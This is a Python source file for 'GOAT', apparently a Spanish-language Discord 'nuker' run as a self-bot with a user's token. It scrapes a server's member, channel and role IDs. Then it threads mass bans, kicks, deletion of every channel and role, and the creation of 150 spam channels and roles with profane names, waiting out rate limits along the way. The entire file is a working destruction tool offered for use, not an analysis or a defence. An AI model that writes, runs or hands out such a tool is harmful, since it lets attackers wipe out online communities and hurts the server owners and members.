import os
import sys
import subprocess
os.system('cls')
def install(paquete):
    subprocess.run(f'{sys.executable} -m pip install {paquete}',stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
def uninstall(paquete):
    subprocess.run(f'{sys.executable} -m pip uninstall {paquete}',stdout = subprocess.PIPE, stderr = subprocess.DEVNULL)
try:
    from pystyle import Colors, Colorate, Center, Box
except:
    install("pystyle")
try:
    import codecs
except:
    install("codecs")
try:
    import requests
except:
    install("requests")
try:
    from pypresence import Presence
except:
    install("pypresence")
try:
    from discord.ext import commands
except:
    uninstall("discord.py")
    install("discord.py-self")
import requests
import threading
import time
import subprocess

from pypresence import Presence
import discord
from discord.ext import commands
from pystyle import Colors, Colorate, Center, Box
os.system(f'title [GOAT] - Configuration & mode 170,40')
if not os.path.exists(f'Scraped/'): os.makedirs(f'Scraped/')
banner = f"""

            @@@@@*                                                                                   
            @@@@@@@@@                                                                                
            @@@@@@@@@@@%                    (@@@@@          @@@@@@@&                   @@@@@@        
            #@@@@@@@@@@@@@@               @@@ @          @@@@@@@@ @@@@,           %@@@@@@@@@@/       
             #@@@@@@@@@@@.@@@@          #@@@@&        &@@@@@@&*@%     *#     .@@@@@@@@@@@@@@@        
               @@@@@@@@@@@@@ @@@@(      @@@@@@@@#/%@@@@ .%@@@@@          &@@@ %@@@@@@@@@@@@@         
                @@@@@@@@@@@@@@&,@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@  *@@@@@@, *@@@@@@@@@@@@@@@@          
                  @@@@@@@@@@@@,  .&@@@@@@@@@@@@#@%@@@@@@@@@@@@@@@#*@  .@@@@@@@@@@@@@@@@@@@           
                      @@@@@@@@@@@@@@@@@@@@@@@@@#&, @@@@@@@@@@@@@@@@,@@@@@@@@@@@@@@@@@@#       
                        .@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&%@%@@@@@@@@@@@@@/     
                            @@@@,@@@@@@@@@@@ (@@@@@@@@@@@@@@@#% @%%@ @@@@@@@@          
                               @,,%@@@@@@@@@(@@@@@@@@@ %@@@@@@@@@@&@,@@@,                    ,ad8888ba,     ,ad8888ba,         db    888888888888  
                                @/@@@@@@@@@@@@@@@@@@@, @@@@@@@@@@@@@                        d8"'    `"8b   d8"'    `"8b       d88b        88       
                                 #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.                       d8'            d8'        `8b     d8'`8b       88       
                                   @@@@@*@@@@@@@@@@@@@@@@@. @@@@@@@                        88             88          88    d8'  `8b      88       
                                   @@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@#                       88      88888  88          88   d8YaaaaY8b     88       
                                   (@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@#                       Y8,        88  Y8,        ,8P  d8""\"\"\"8b    88       
                                    @@.@@@@@@@@@@@@@@@@@@@@@@@@@@@@                         Y8a.    .a88   Y8a.    .a8P  d8'        `8b   88       
                                    &@@@@@@@@@@@@@&@@@@@@@@@@@@,@@@                          `"Y88888P"     `"Y8888Y"'  d8'          `8b  88 
                                    @@@&.      (@@@@@@@@@@@@@@@@@@                     
                                   @@@ %@@%@# (@@@@@@@@@@@@@@@@@@#                            
                                   &@@@@@@@(@@@@@@@@@@@@#@@@@@@@*                             
                                   *@@@@@@ @@@@@@@@@@@&#@@@@@@@                               
                                    *@@@@@ @@@@@@@@& .@@@@@@@@                                       
                                      @/.       %@@@@@@@@.                                           
                                      @@@@@@@@@@@@@@@@@                                              
                                        @@@@@@@@@@@@                                                 
                                            %%%%  
                                             %%              
                                              %%


"""
print(Center.XCenter(Colorate.Vertical(Colors.black_to_red, banner, 1)))
print(Center.XCenter(Colorate.Color(Colors.dark_red, Box.Lines("Bienvenid@ a Goat, el mejor Nuker de Discord"), 1)))
token = input(Colorate.Color(Colors.dark_red, '[>] Token: '))


headers = {'Authorization': f'{token}'}
client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True)

client.remove_command("help")

class GOAT:
    global print_error, print_info, print_success
    def print_info(text):
        print(Colorate.Color(Colors.dark_blue, f'[') + "!" + Colorate.Color(Colors.dark_blue, f']') + text)
    def print_success(text):
        print(Colorate.Color(Colors.dark_green, f'[') + "+" + Colorate.Color(Colors.dark_green, f']') + text)
    def print_error(text):
        print(Colorate.Color(Colors.dark_red, f'[') + "-" + Colorate.Color(Colors.dark_red, f']') + text)
    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print_success('Baneado ' + Colorate.Color(Colors.dark_green, member.strip()))
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print_success('Kickeado ' + Colorate.Color(Colors.dark_green, member.strip()))
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print_error('Canal eliminado ' + Colorate.Color(Colors.dark_red, channel.strip()))
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print_error('Rol eliminado ' + Colorate.Color(Colors.dark_red, role.strip()))
                    break
                else:
                    break

    def SpamChannels(self, guild):
        while True:
            json = {'name': "fuckedbygoat", 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print_success('Canal creado ' + Colorate.Color(Colors.dark_green, 'nukedbygoat'))
                    break
                else:
                    break

    def SpamRoles(self, guild):
        while True:
            json = {'name': 'Fucked by GOAT'}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print_success('Rol creado ' + Colorate.Color(Colors.dark_green, 'Fucked by GOAT'))
                    break
                else:
                    break
    async def Scrape(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Scraped/members.txt")
            os.remove("Scraped/channels.txt")
            os.remove("Scraped/roles.txt")
        except:
            pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print_success('Miembros encontrados ' + Colorate.Color(Colors.dark_green, str(membercount)))
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print_success('Canales encontrados ' + Colorate.Color(Colors.dark_green, str(channelcount)))
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print_success('Roles encontrados ' + Colorate.Color(Colors.dark_green, str(rolecount)))
            r.close()

    async def NukeExecute(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(150):
            threading.Thread(target=self.SpamChannels, args=(guild,)).start()
        for i in range(150):
            threading.Thread(target=self.SpamRoles, args=(guild,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        print()
        for i in range(150):
            threading.Thread(target=self.SpamChannels, args=(guild,)).start()

    async def RoleSpamExecute(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        print()
        for i in range(150):
            threading.Thread(target=self.SpamRoles, args=(guild,)).start()

    async def PruneMembers(self):
        guild = input(Colorate.Color(Colors.dark_red, '> ') + 'ID del servidor ')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)
    global goattext
    goattext = """


                      ,ad8888ba,     ,ad8888ba,         db    888888888888  
                     d8"'    `"8b   d8"'    `"8b       d88b        88       
                    d8'            d8'        `8b     d8'`8b       88       
                    88             88          88    d8'  `8b      88       
                    88      88888  88          88   d8YaaaaY8b     88       
                    Y8,        88  Y8,        ,8P  d8\"\"\"\"8b    88       
                     Y8a.    .a88   Y8a.    .a8P  d8'        `8b   88       
                      `"Y88888P"     `"Y8888Y"'  d8'          `8b  88 
    
    """
    def Credits(self):
        os.system(f'cls & mode 100,30 & title [GOAT] - Credits')
        print(Center.XCenter(Colorate.Vertical(Colors.black_to_red, goattext + "\n\nCoded By Lucky", 1)))


    async def Menu(self):
        os.system(f'cls & mode 100,30 & title [GOAT] - Connected: {client.user}')
        print(Colorate.Vertical(Colors.black_to_red, goattext, 1))
        print(Colorate.Color(Colors.dark_red,f'''
            ╔═══════════════════════╦═══════════════════════╦═══════════════════════╗
            ║ [1] Ban Members       ║ [5] Delete Channels   ║ [9] Scrape Info       ║
            ║ [2] Kick Members      ║ [6] Create Roles      ║ [c] Credits           ║
            ║ [3] Purge Members     ║ [7] Create Channels   ║ [x] Exit              ║
            ║ [4] Delete Roles      ║ [8] Nuke server       ║                       ║
            ╚═══════════════════════╩═══════════════════════╩═══════════════════════╝
      '''))

        choice = input(Colorate.Color(Colors.dark_red, '> ') + 'Opcion ')
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == 'C' or choice == 'c':
            self.Credits()
            input()
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_connect():
        await GOAT().Menu()
            
    def Startup(self):
        try:
            client.run(token)
        except Exception as e:
            print(Colorate.Color(Colors.dark_red, 'Token invalido ' + e))
            input()
            os._exit(0)

if __name__ == "__main__":
    GOAT().Startup()
